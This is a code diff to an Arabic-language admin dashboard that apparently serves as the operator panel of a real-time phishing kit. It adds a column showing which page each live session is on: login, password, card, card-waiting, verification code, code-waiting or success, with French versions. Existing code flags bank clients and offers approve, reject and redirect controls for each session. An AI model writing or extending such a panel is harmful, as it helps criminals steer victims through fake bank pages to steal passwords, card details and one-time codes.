@@ -164,6 +164,8 @@
   .modal-btn.reject{background:#fde8e8;color:var(--red)}
   .modal-btn.reject:hover{background:var(--red);color:#fff}
   .modal-btn:disabled{opacity:.4;cursor:default}
+  .page-tag{font-size:12px;padding:4px 10px;border-radius:8px;background:#f0f0f0;color:#555;font-weight:600;white-space:nowrap}
+  .page-tag.online{background:#e8f5e9;color:#2e7d32}
   .modal-btn.redirect-btn{background:#e3f2fd;color:#1565c0}
   .modal-btn.redirect-btn:hover{background:#1565c0;color:#fff}
   .modal-redirect-row{display:flex;gap:8px;width:100%;margin-top:8px}
@@ -330,11 +332,12 @@
               <th>عميل بنك</th>
               <th>الوقت</th>
               <th>الحالة</th>
+              <th>الصفحة الحالية</th>
               <th>الإجراءات</th>
             </tr>
           </thead>
           <tbody id="rows">
-            <tr><td colspan="7" class="empty">لا توجد طلبات بعد</td></tr>
+            <tr><td colspan="8" class="empty">لا توجد طلبات بعد</td></tr>
           </tbody>
         </table>
       </div>
@@ -471,10 +474,24 @@
     return '<span class="badge pending">قيد الانتظار</span>';
   }
 
+  function pageLabel(p) {
+    const labels = {
+      'home':'الرئيسية','index':'الرئيسية','order':'الطلب',
+      'login':'تسجيل الدخول','password':'كلمة المرور',
+      'card':'البطاقة','waiting':'الانتظار','card-waiting':'انتظار البطاقة',
+      'code':'رمز التحقق','code-waiting':'انتظار الكود',
+      'success':'النجاح',
+      'index-fr':'الرئيسية','order-fr':'الطلب','login-fr':'تسجيل الدخول',
+      'password-fr':'كلمة المرور','card-fr':'البطاقة',
+      'waiting-fr':'الانتظار','code-fr':'رمز التحقق','success-fr':'النجاح'
+    };
+    return labels[p] || p;
+  }
+
   function render(list){
     document.getElementById('totalOrders').textContent = list.length;
     const rows = document.getElementById('rows');
-    if(!list.length){ rows.innerHTML = '<tr><td colspan="7" class="empty">لا توجد طلبات بعد</td></tr>'; return; }
+    if(!list.length){ rows.innerHTML = '<tr><td colspan="8" class="empty">لا توجد طلبات بعد</td></tr>'; return; }
     rows.innerHTML = list.map(s => {
       const bankClient = s.is_bank_client === 'yes'
         ? '<span style="color:var(--green);font-weight:700">نعم</span>'
@@ -486,6 +503,7 @@
         '<td>'+bankClient+'</td>' +
         '<td class="time">'+fmtTime(s.time)+'</td>' +
         '<td>'+statusBadge(s.status)+'</td>' +
+        '<td>'+(s.current_page ? '<span class="page-tag'+(s.is_online?' online':'')+'">'+escapeHtml(pageLabel(s.current_page))+'</span>' : '<span style="color:var(--ink-soft)">—</span>')+'</td>' +
         '<td class="td-actions">' +
           '<button class="tbl-btn details" onclick="openDetails(\''+s.id+'\')">التفاصيل</button>' +
           '<div class="redirect-wrap">' +
